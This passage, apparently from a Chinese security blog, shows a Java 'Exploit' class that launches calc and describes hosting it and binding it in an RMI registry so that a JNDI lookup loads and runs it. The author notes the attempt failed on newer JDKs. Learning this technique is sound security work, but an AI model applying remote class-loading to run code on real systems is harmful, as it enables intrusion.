+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.log4j2.JNDIRMI;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Exploit</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>使用javac命令，将该类编译成class文件挂载在web页面上。</p>
+<p><img src="/imgs/$%7Bfiilename%7D/image-20230726143732215.png" alt="image-20230726143732215"></p>
+<p>先运行RMIServer把恶意类绑定在RMI的Registry 里面，然后在运行RMIClient，在客户端调用<code>lookup</code>远程获取远程类的时候就会去寻找我们在RMI里面绑定的恶意类，请求到远程的类后会在本地进行执行。</p>
+<p><img src="/imgs/$%7Bfiilename%7D/image-20230726145458695.png" alt="image-20230726145458695"></p>
+<p>我在这里其实是执行失败了，因为在高版本中，系统属性 <code>com.sun.jndi.rmi.object.trustURLCodebase</code>、<code>com.sun.jndi.cosnaming.object.trustURLCodebase</code> 的默认值变为false。而在低版本中这几个选项默认为true，可以远程加载一些类。</p>
+
+
+                </div>
+            </article>
+
+
+            <div class="post-tags center">
+                
+                    <span class="post-tag chip">
+                        <a href="/tags/java/">java</a>
+                   </span>
+                
+            </div>
+
+
+            <div class="social-share" data-mobile-sites="weibo,qq,qzone,facebook,twitter">
+                <span id="share-to">Share to</span>
+            </div>
+
+            <div class="post-footer">
+                
+                
+                    <a class="right" href="/2021/11/13/ActiveMQ%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%E6%BC%8F%E6%B4%9E/" rel="next" title="ActiveMQ任意文件写入漏洞">
+                        ActiveMQ任意文件写入漏洞<i
+                                class="fa fa-arrow-circle-right fa-3x "></i>
+                    </a>
+                
+            </div>
+        </div>
+    </div>
+
+
+</main>
+
+<footer>
+    
+        <footer class="page-footer">
+    <div class="footer-copyright">
+        <div class="container">
+            <div>© 2017 Copyright ebandeng
+                <span class="right">
+                powered by
+                <a target="_blank" rel="noopener" href="http://hexo.io">hexo</a>.
+                theme:
+                <a target="_blank" rel="noopener" href="https://github.com/jonashao/hexo-theme-pteris">pteris</a>
+                </span>
+            </div>
+        </div>
+    </div>
+
+    
+</footer>
+
+    
+</footer>
+
+
+    
+<script src="/lib/jquery/dist/jquery.min.js"></script>
+
+
+<script src="/lib/materialize/dist/js/materialize.min.js"></script>
+
+
+<script src="/lib/headroom.js/dist/headroom.min.js"></script>
+
+
+<script src="/lib/headroom.js/dist/jQuery.headroom.min.js"></script>
+
+
+
+
+    
+<script src="/lib/social-share.js/dist/js/share.min.js"></script>
+
+
+
+
+
+<script src="/js/pteris.js"></script>
+
+
+
+    
+<script src="/lib/lightgallery.js/dist/js/lightgallery.min.js"></script>
+
+
+
+
+
+
+
+
+
+</body>
+</html>
